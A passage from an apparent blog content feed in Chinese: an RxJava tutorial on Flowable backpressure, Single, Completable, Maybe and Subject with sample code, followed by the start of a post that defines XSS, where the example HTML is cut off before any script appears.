mObservable.subscribe(mObserver);</span><br></pre></td></tr></table></figure><p>这种观察者模型不支持背压：当被观察者快速发送大量数据时，下游不会做其他处理，即使数据大量堆积，调用链也不会报MissingBackpressureException,消耗内存过大只会OOM。所以，当我们使用Observable&#x2F;Observer的时候，我们需要考虑的是，数据量是不是很大(官方给出以1000个事件为分界线作为参考)。</p><h3 id="Flowable-Subscriber"><a href="#Flowable-Subscriber" class="headerlink" title="Flowable&#x2F;Subscriber"></a>Flowable&#x2F;Subscriber</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Flowable.range(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">        .subscribe(<span class="keyword">new</span> <span class="title class_">Subscriber</span>&lt;Integer&gt;() &#123;</span><br><span class="line">            Subscription sub;</span><br><span class="line">            <span class="comment">//当订阅后，会首先调用这个方法，其实就相当于onStart()，</span></span><br><span class="line">            <span class="comment">//传入的Subscription s参数可以用于请求数据或者取消订阅</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSubscribe</span><span class="params">(Subscription s)</span> &#123;</span><br><span class="line">                Log.w(<span class="string">&quot;TAG&quot;</span>,<span class="string">&quot;onsubscribe start&quot;</span>);</span><br><span class="line">                sub=s;</span><br><span class="line">                sub.request(<span class="number">1</span>);</span><br><span class="line">                Log.w(<span class="string">&quot;TAG&quot;</span>,<span class="string">&quot;onsubscribe end&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNext</span><span class="params">(Integer o)</span> &#123;</span><br><span class="line">                Log.w(<span class="string">&quot;TAG&quot;</span>,<span class="string">&quot;onNext---&gt;&quot;</span>+o);</span><br><span class="line">                sub.request(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Throwable t)</span> &#123;</span><br><span class="line">                t.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">()</span> &#123;</span><br><span class="line">                Log.w(<span class="string">&quot;TAG&quot;</span>,<span class="string">&quot;onComplete&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);  </span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onsubscribe <span class="keyword">start</span></span><br><span class="line">onsubscribe <span class="keyword">end</span></span><br><span class="line">onNext<span class="comment">---&gt;0</span></span><br><span class="line">onNext<span class="comment">---&gt;1</span></span><br><span class="line">onNext<span class="comment">---&gt;2</span></span><br><span class="line">...</span><br><span class="line">onNext<span class="comment">---&gt;9</span></span><br><span class="line">onComplete</span><br></pre></td></tr></table></figure><p>Flowable是支持背压的，也就是说，一般而言，上游的被观察者会响应下游观察者的数据请求，下游调用request(n)来告诉上游发送多少个数据。这样避免了大量数据堆积在调用链上，使内存一直处于较低水平。</p><p>当然，Flowable也可以通过creat()来创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Flowable.create(<span class="keyword">new</span> <span class="title class_">FlowableOnSubscribe</span>&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">subscribe</span><span class="params">(FlowableEmitter&lt;Integer&gt; e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        e.onNext(<span class="number">1</span>);</span><br><span class="line">        e.onNext(<span class="number">2</span>);</span><br><span class="line">        e.onNext(<span class="number">3</span>);</span><br><span class="line">        e.onNext(<span class="number">4</span>);</span><br><span class="line">        e.onComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//需要指定背压策略</span></span><br><span class="line">, BackpressureStrategy.BUFFER);</span><br></pre></td></tr></table></figure><p>Flowable虽然可以通过create()来创建，但是你必须指定背压的策略，以保证你创建的Flowable是支持背压的。</p><h3 id="其他的观察者"><a href="#其他的观察者" class="headerlink" title="其他的观察者"></a>其他的观察者</h3><p>最常用的其实就是上面说的两种订阅观察者，但是一些情况下，我们也会用到一些其他的一类观察者比如</p><ul><li>Single&#x2F;SingleObserver</li><li>Completable&#x2F;CompletableObserver</li><li>Maybe&#x2F;MaybeObserver</li></ul><h4 id="Single-SingleObserver"><a href="#Single-SingleObserver" class="headerlink" title="Single&#x2F;SingleObserver"></a>Single&#x2F;SingleObserver</h4><p>Single类似于Observable，不同的是，它总是只发射一个值，或者一个错误通知，而不是发射一系列的值（当然就不存在背压问题），所以当你使用一个单一连续事件流，这样你可以使用Single。Single观察者只包含两个事件，一个是正常处理成功的onSuccess，另一个是处理失败的onError。因此，不同于Observable需要三个方法onNext, onError, onCompleted，订阅Single只需要两个方法：</p><ul><li>onSuccess - Single发射单个的值到这个方法</li><li>onError - 如果无法发射需要的值，Single发射一个Throwable对象到这个方法</li></ul><p>Single只会调用这两个方法中的一个，而且只会调用一次，调用了任何一个方法之后，订阅关系终止。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//被观察者</span><br><span class="line">    Single&lt;String&gt; single = Single.create(new SingleOnSubscribe&lt;String&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void subscribe(SingleEmitter&lt;String&gt; e) throws Exception &#123;</span><br><span class="line">            e.onSuccess(&quot;test&quot;);</span><br><span class="line">            e.onSuccess(&quot;test2&quot;);//错误写法，重复调用也不会处理，因为只会调用一次</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    //订阅观察者SingleObserver</span><br><span class="line">    single.subscribe(new SingleObserver&lt;String&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void onSubscribe(Disposable d) &#123;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        @Override</span><br><span class="line">        public void onSuccess(String s) &#123;</span><br><span class="line">            //相当于onNext和onComplete</span><br><span class="line">            Log.d(&quot;lucas&quot;,  s  );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        @Override</span><br><span class="line">        public void onError(Throwable e) &#123;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">//运行结果</span><br><span class="line">2020-04-03 23:02:37.337 15462-15462/com.ysalliance.getfan.myapplication D/lucas: test</span><br></pre></td></tr></table></figure><h4 id="Completable-CompletableObserver"><a href="#Completable-CompletableObserver" class="headerlink" title="Completable&#x2F;CompletableObserver"></a>Completable&#x2F;CompletableObserver</h4><p>如果你的观察者连onNext事件都不关心，可以使用Completable，它只有onComplete和onError两个事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    Completable.create(<span class="keyword">new</span> <span class="title class_">CompletableOnSubscribe</span>() &#123;<span class="comment">//被观察者</span></span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">subscribe</span><span class="params">(CompletableEmitter e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            e.onComplete();<span class="comment">//单一onComplete或者onError</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;).subscribe(<span class="keyword">new</span> <span class="title class_">CompletableObserver</span>() &#123;<span class="comment">//观察者</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSubscribe</span><span class="params">(Disposable d)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;lucas&quot;</span>, <span class="string">&quot;onComplete: &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Throwable e)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//打印结果</span></span><br><span class="line"><span class="number">2020</span>-<span class="number">04</span>-<span class="number">03</span> <span class="number">23</span>:<span class="number">12</span>:<span class="number">08.099</span> <span class="number">16264</span>-<span class="number">16264</span>/com.ysalliance.getfan.myapplication E/lucas: onComplete: </span><br></pre></td></tr></table></figure><p>要转换成其他类型的被观察者，也是可以使用toFlowable()、toObservable()等方法去转换。</p><h4 id="Maybe-MaybeObserver"><a href="#Maybe-MaybeObserver" class="headerlink" title="Maybe&#x2F;MaybeObserver"></a>Maybe&#x2F;MaybeObserver</h4><p>如果你有一个需求是可能发送一个数据或者不会发送任何数据，这时候你就需要Maybe，它类似于Single和Completable的混合体。</p><p>  Maybe可能会调用以下其中一种情况（也就是所谓的Maybe）：</p><ul><li><p>onSuccess或者onError</p></li><li><p>onComplete或者onError 可以看到onSuccess和onComplete是互斥的存在，例子代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//被观察者</span></span><br><span class="line">  Maybe&lt;String&gt; maybe = Maybe.create(<span class="keyword">new</span> <span class="title class_">MaybeOnSubscribe</span>&lt;String&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">subscribe</span><span class="params">(MaybeEmitter&lt;String&gt; e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">          e.onSuccess(<span class="string">&quot;test&quot;</span>);<span class="comment">//发送一个数据的情况，或者onError，不需要再调用onComplete(调用了也不会触发onComplete回调方法)</span></span><br><span class="line">          <span class="comment">//e.onComplete();//不需要发送数据的情况，或者onError</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">   </span><br><span class="line">  <span class="comment">//订阅观察者</span></span><br><span class="line">  maybe.subscribe(<span class="keyword">new</span> <span class="title class_">MaybeObserver</span>&lt;String&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSubscribe</span><span class="params">(Disposable d)</span> &#123;</span><br><span class="line">   </span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(String s)</span> &#123;</span><br><span class="line">          <span class="comment">//发送一个数据时，相当于onNext和onComplete，但不会触发另一个方法onComplete</span></span><br><span class="line">          Log.i(<span class="string">&quot;lucas&quot;</span>, s);</span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="comment">//无数据发送时候的onComplete事件</span></span><br><span class="line">          Log.i(<span class="string">&quot;lucas&quot;</span>, <span class="string">&quot;onComplete&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Throwable e)</span> &#123;</span><br><span class="line">   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//打印结果</span></span><br><span class="line"><span class="number">2020</span>-<span class="number">04</span>-<span class="number">03</span> <span class="number">23</span>:<span class="number">14</span>:<span class="number">40.266</span> <span class="number">16558</span>-<span class="number">16558</span>/com.ysalliance.getfan.myapplication I/lucas: test</span><br></pre></td></tr></table></figure></li></ul><p>要转换成其他类型的被观察者，也是可以使用toFlowable()、toObservable()等方法去转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否登陆</span></span><br><span class="line">Maybe.just(isLogin())</span><br><span class="line">    <span class="comment">//可能涉及到IO操作，放在子线程</span></span><br><span class="line">    .subscribeOn(Schedulers.newThread())</span><br><span class="line">    <span class="comment">//取回结果传到主线程</span></span><br><span class="line">    .observeOn(AndroidSchedulers.mainThread())</span><br><span class="line">    .subscribe(<span class="keyword">new</span> <span class="title class_">MaybeObserver</span>&lt;Boolean&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSubscribe</span><span class="params">(Disposable d)</span> &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(Boolean value)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(value)&#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Throwable e)</span> &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);复制代码</span><br></pre></td></tr></table></figure><p>上面就是Maybe&#x2F;MaybeObserver的普通用法，你可以看到，实际上，这种观察者模式并不用于发送大量数据，而是发送单个数据，也就是说，当你只想要某个事件的结果（true or false)的时候，你可以用这种观察者模式</p><h2 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h2><p>在 RxJava 中，Subject 是一种特殊的 Observable，同时也实现了 Observer 接口，因此它可以充当观察者和可观察对象。Subject 可以用来在不同的线程中传递数据，充当事件总线，让多个观察者能够订阅和接收事件。</p><p>以下是 RxJava 中主要的几种 Subject 类型：</p><ol><li><p><strong>PublishSubject：</strong> 在创建后，它只会将在订阅之后产生的事件发送给观察者。对于在订阅之前产生的事件，观察者无法接收到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PublishSubject&lt;String&gt; publishSubject = PublishSubject.create();</span><br></pre></td></tr></table></figure></li><li><p><strong>BehaviorSubject：</strong> 在创建后，它会发送最近的一个事件给观察者，然后正常发送在订阅之后产生的事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BehaviorSubject&lt;String&gt; behaviorSubject = BehaviorSubject.create();</span><br></pre></td></tr></table></figure></li><li><p><strong>ReplaySubject：</strong> 在创建后，会将所有事件（或者仅限于最近的 N 个事件）发送给观察者，无论它们是在订阅之前还是之后产生的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReplaySubject&lt;String&gt; replaySubject = ReplaySubject.create();</span><br></pre></td></tr></table></figure></li><li><p><strong>AsyncSubject：</strong> 在创建后，只有在源 Observable 完成时，它才会将最后一个事件发送给观察者。如果源 Observable 没有发射任何数据，AsyncSubject 也不会发射任何数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AsyncSubject&lt;String&gt; asyncSubject = AsyncSubject.create();</span><br></pre></td></tr></table></figure></li></ol><p>Subject 具有 Observable 和 Observer 的双重角色，可以用来把事件转发给多个观察者，也可以订阅其他 Observable 发射的事件。需要注意的是，Subject 不是线程安全的，因此在多线程环境中使用时需要注意同步的问题。</p><p>使用 Subject 时，要注意避免在不同线程中使用同一个 Subject 实例，因为它可能导致线程安全问题。通常情况下，可以使用 <code>observeOn</code> 和 <code>subscribeOn</code> 操作符来确保事件在正确的线程上被触发。</p><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><p>RxJava操作符众多，后面再整理</p><h2 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2><p>下面的代码是在ai_album项目中异步处理图片缩略图生成任务，在图库检测到图片后发布订阅任务给观察者。</p><p>初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">private PublishSubject&lt;List&lt;Photo&gt;&gt; imageListSubject;</span><br><span class="line"></span><br><span class="line">   private PublishSubject&lt;Photo&gt; imageSubject;</span><br><span class="line"></span><br><span class="line">   @PostConstruct</span><br><span class="line">   public void init() &#123;</span><br><span class="line">       imageSubject = PublishSubject.create();</span><br><span class="line">       imageListSubject = PublishSubject.create();</span><br><span class="line"></span><br><span class="line">       Observer&lt;List&lt;Photo&gt;&gt; imageListObserver = new Observer&lt;List&lt;Photo&gt;&gt;() &#123;</span><br><span class="line">           @Override</span><br><span class="line">           public void onNext(List&lt;Photo&gt; photoList) &#123;</span><br><span class="line">               List&lt;Photo&gt; photoWithThumbnailList = ThumbnailUtils.generateThumbnail(photoList, constantDynamic.getThumbnailSaveFolder());</span><br><span class="line">               for (Photo photo : photoWithThumbnailList) &#123;</span><br><span class="line">                   photoRepository.updateThumbnailPath(photo.getMd5(),photo.getThumbnailPath());</span><br><span class="line">                   log.info(&quot;Generate image thumbnail completed. &quot; + photo.getFileName());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           @Override</span><br><span class="line">           public void onError(Throwable e) &#123;</span><br><span class="line">               log.error(&quot;Failed to generate image thumbnail: &quot;, e);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           @Override</span><br><span class="line">           public void onCompleted() &#123;</span><br><span class="line">               // 任务完成事件，暂时不需要</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       Observer&lt;Photo&gt; imageObserver = new Observer&lt;Photo&gt;() &#123;</span><br><span class="line">           @Override</span><br><span class="line">           public void onNext(Photo photo) &#123;</span><br><span class="line">               String path = ThumbnailUtils.generateThumbnail(photo.getPath(), constantDynamic.getThumbnailSaveFolder());</span><br><span class="line">               photo.setThumbnailPath(path);</span><br><span class="line">               photoRepository.updateThumbnailPath(photo.getMd5(),photo.getThumbnailPath());</span><br><span class="line">               log.info(&quot;Generate image thumbnail completed.&quot; + photo.getFileName());</span><br><span class="line">               // print打印当前时间</span><br><span class="line">               System.out.println(photo.getFileName() + &quot;thumbanil success  &quot; +LocalDateTime.now().format(DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss&quot;)));</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           @Override</span><br><span class="line">           public void onError(Throwable e) &#123;</span><br><span class="line">               log.error(&quot;Failed to generate image thumbnail:&quot;, e);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           @Override</span><br><span class="line">           public void onCompleted() &#123;</span><br><span class="line">               // 任务完成事件，暂时不需要</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       imageSubject.observeOn(Schedulers.io())</span><br><span class="line">               .subscribe(imageObserver);</span><br><span class="line"></span><br><span class="line">       imageListSubject.observeOn(Schedulers.io())</span><br><span class="line">               .subscribe(imageListObserver);</span><br><span class="line"></span><br><span class="line">       scanAllPath();</span><br><span class="line"></span><br><span class="line">       loadGeoJson();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在实际调用的地方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">   public void addPhoto(File file)&#123;</span><br><span class="line">       String md5 = MD5Utils.getFileChecksumMD5(file);</span><br><span class="line">       if (md5 == null) &#123;</span><br><span class="line">           return;</span><br><span class="line">       &#125;</span><br><span class="line">       Photo photo = photoRepository.findPhotoByMd5(md5);</span><br><span class="line">       if (photo != null) &#123;</span><br><span class="line">           if (photo.getPath().contains(file.getAbsolutePath()))&#123;</span><br><span class="line">               return;</span><br><span class="line">           &#125;</span><br><span class="line">           if (&quot;&quot;.equals(photo.getPath()))&#123;</span><br><span class="line">               photo.setPath(file.getAbsolutePath());</span><br><span class="line">               photo.setDeleted(false);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               photo.setPath(photo.getPath() + &quot;;&quot; + file.getAbsolutePath());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           photo = createPhotoObjectFromImageFile(file);</span><br><span class="line">       &#125;</span><br><span class="line">       photoRepository.save(photo);</span><br><span class="line">       imageSubject.onNext(photo);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS、同源策略和CSRF</title>
    <link href="/2023/12/21/XSS%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8CCSRF/"/>
    <url>/2023/12/21/XSS%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8CCSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h2><p><strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%85%A5">代码注入</a>的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>攻击者通过注入恶意脚本，使其在用户浏览器中执行。这种攻击可以用于盗取用户的信息、会话令牌等，或者劫持流量实现恶意跳转。</p><p>该漏洞在客户端和服务器端都会发生，所以均要进行防护操作。</p><p>简单的代码示例（该示例是仅在客户端进行攻击）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    